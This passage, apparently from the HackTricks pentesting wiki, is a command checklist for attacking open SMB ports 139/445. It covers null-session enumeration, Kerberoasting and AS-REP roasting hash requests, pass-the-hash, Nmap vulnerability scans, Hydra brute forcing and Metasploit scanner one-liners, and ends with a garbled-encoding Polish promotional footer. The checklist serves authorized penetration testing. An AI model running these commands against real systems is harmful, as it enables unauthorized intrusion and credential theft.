While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF** sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
